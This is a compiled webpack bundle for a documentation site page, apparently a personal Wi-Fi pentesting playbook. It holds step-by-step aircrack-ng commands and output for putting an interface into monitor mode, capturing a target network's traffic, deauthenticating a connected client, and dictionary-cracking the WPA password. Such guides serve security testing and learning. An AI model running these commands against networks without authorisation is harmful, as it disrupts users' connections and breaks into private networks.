"use strict";(self.webpackChunkdocs=self.webpackChunkdocs||[]).push([[3057],{4515:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>s,default:()=>h,frontMatter:()=>r,metadata:()=>i,toc:()=>l});const i=JSON.parse('{"id":"Hacking/Playbooks/Pentesting Wifi networks","title":"Pentesting wifi networks","description":"Put your wifi interface in monitor mode to capture not only the WiFi traffic routed to the device, but all the traffic that is transmitted over the air.","source":"@site/docs/Hacking/Playbooks/Pentesting Wifi networks.md","sourceDirName":"Hacking/Playbooks","slug":"/playbooks/wifi","permalink":"/docs/playbooks/wifi","draft":false,"unlisted":false,"tags":[],"version":"current","frontMatter":{"slug":"/playbooks/wifi","pagination_next":null,"pagination_prev":null},"sidebar":"tutorialSidebar"}');var a=t(4848),o=t(8453);const r={slug:"/playbooks/wifi",pagination_next:null,pagination_prev:null},s="Pentesting wifi networks",c={},l=[{value:"Enable monitor mode",id:"enable-monitor-mode",level:2},{value:"Capture the traffic",id:"capture-the-traffic",level:2},{value:"Deauth attack",id:"deauth-attack",level:2},{value:"Crack the password",id:"crack-the-password",level:2},{value:"Revert to normal mode",id:"revert-to-normal-mode",level:2}];function d(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",header:"header",li:"li",ol:"ol",p:"p",pre:"pre",...(0,o.R)(),...e.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(n.header,{children:(0,a.jsx)(n.h1,{id:"pentesting-wifi-networks",children:"Pentesting wifi networks"})}),"\n",(0,a.jsx)(n.p,{children:"Put your wifi interface in monitor mode to capture not only the WiFi traffic routed to the device, but all the traffic that is transmitted over the air."}),"\n",(0,a.jsx)(n.h2,{id:"enable-monitor-mode",children:"Enable monitor mode"}),"\n",(0,a.jsxs)(n.ol,{children:["\n",(0,a.jsx)(n.li,{children:"Check if you have processes that will interfere with monitor mode:"}),"\n"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"\u2514\u2500$ sudo airmon-ng check                                                    \n[sudo] password for gal: \n\nFound 4 processes that could cause trouble.\nKill them using 'airmon-ng check kill' before putting\nthe card in monitor mode, they will interfere by changing channels\nand sometimes putting the interface back in managed mode\n\n    PID Name\n    817 avahi-daemon\n    839 avahi-daemon\n    891 NetworkManager\n    963 wpa_supplicant\n"})}),"\n",(0,a.jsxs)(n.ol,{start:"2",children:["\n",(0,a.jsx)(n.li,{children:"Kill them"}),"\n"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"\u250c\u2500\u2500(gal\u327fgal)-[~/workspace/gal/docs]\n\u2514\u2500$ sudo airmon-ng check kill\n\nKilling these processes:\n\n    PID Name\n    963 wpa_supplicant\n"})}),"\n",(0,a.jsxs)(n.ol,{start:"3",children:["\n",(0,a.jsx)(n.li,{children:"Start monitor mode"}),"\n"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"\u2514\u2500$ sudo airmon-ng start wlan0  \n\n\nPHY     Interface       Driver          Chipset\n\nphy0    wlan0           iwlwifi         Intel Corporation Alder Lake-P PCH CNVi WiFi (rev 01)\n                (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)\n                (mac80211 station mode vif disabled for [phy0]wlan0)\n"})}),"\n",(0,a.jsxs)(n.p,{children:["Now ",(0,a.jsx)(n.code,{children:"wlan0"})," might change to ",(0,a.jsx)(n.code,{children:"wlan0mon"})]}),"\n",(0,a.jsx)(n.h2,{id:"capture-the-traffic",children:"Capture the traffic"}),"\n",(0,a.jsxs)(n.ol,{children:["\n",(0,a.jsx)(n.li,{children:"Start checking what's around:"}),"\n"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"sudo airodump-ng wlan0mon\n"})}),"\n",(0,a.jsxs)(n.ol,{start:"2",children:["\n",(0,a.jsx)(n.li,{children:"Once you have found a target, specify the channel and the bssid:"}),"\n"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"sudo airodump-ng --bssid 66:8B:92:F9:A2:9A  -w /tmp/guifiwc wlan0mon -c 11\n"})}),"\n",(0,a.jsxs)(n.p,{children:["This will store the traffic in the specified files with ",(0,a.jsx)(n.code,{children:"-w"}),". Once you find an station connected to the bssid, you can start a ",(0,a.jsx)(n.code,{children:"de-auth"})," attack."]}),"\n",(0,a.jsx)(n.h2,{id:"deauth-attack",children:"Deauth attack"}),"\n",(0,a.jsx)(n.p,{children:"The deauth attack will send packets to the WiFi client to force a de-authentication and a later authentication within the network. This will produce a bunch of auth messages signed with the hash of the WiFi password, which later we'll try to bruteforce with a dictionary attack."}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"sudo aireplay-ng -0 2 -c FA:50:A4:49:2F:AA -a 66:8B:92:F9:A2:9A wlan0mon\n"})}),"\n",(0,a.jsxs)(n.p,{children:[(0,a.jsx)(n.code,{children:"-0"})," means deauth and ",(0,a.jsx)(n.code,{children:"2"})," is the number of deauth packets to send\n",(0,a.jsx)(n.code,{children:"-c"})," is the client MAC address\n",(0,a.jsx)(n.code,{children:"-a"})," is the station BSSID."]}),"\n",(0,a.jsxs)(n.p,{children:["Once this is done successfully, ",(0,a.jsx)(n.code,{children:"airodump"})," will show a bunch of received data."]}),"\n",(0,a.jsx)(n.h2,{id:"crack-the-password",children:"Crack the password"}),"\n",(0,a.jsxs)(n.p,{children:["Now pass the capture to ",(0,a.jsx)(n.code,{children:"aircrack-ng"})," to bruteforce the password using a dictionary:"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"aircrack-ng -a2 -b 66:8B:92:F9:A2:9A -w /usr/share/wordlists/rockyou.txt /tmp/guifiwc-02.cap\n"})}),"\n",(0,a.jsx)(n.h2,{id:"revert-to-normal-mode",children:"Revert to normal mode"}),"\n",(0,a.jsx)(n.p,{children:"Stop airmin-ng:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"\u2514\u2500$ sudo airmon-ng stop wlan0mon\n\nPHY     Interface       Driver          Chipset\n\nphy0    wlan0mon        iwlwifi         Intel Corporation Alder Lake-P PCH CNVi WiFi (rev 01)\n                (mac80211 station mode vif enabled on [phy0]wlan0)\n                (mac80211 monitor mode vif disabled for [phy0]wlan0mon)\n"})}),"\n",(0,a.jsxs)(n.p,{children:["You might need to start ",(0,a.jsx)(n.code,{children:"NetworkManager"})," or similar:"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"sudo NetworkManager\n"})}),"\n",(0,a.jsxs)(n.p,{children:["More: ",(0,a.jsx)(n.a,{href:"https://github.com/ricardojoserf/wifi-pentesting-guide?tab=readme-ov-file#4",children:"https://github.com/ricardojoserf/wifi-pentesting-guide?tab=readme-ov-file#4"})]})]})}function h(e={}){const{wrapper:n}={...(0,o.R)(),...e.components};return n?(0,a.jsx)(n,{...e,children:(0,a.jsx)(d,{...e})}):d(e)}},8453:(e,n,t)=>{t.d(n,{R:()=>r,x:()=>s});var i=t(6540);const a={},o=i.createContext(a);function r(e){const n=i.useContext(o);return i.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function s(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:r(e.components),i.createElement(o.Provider,{value:n},e.children)}}}]);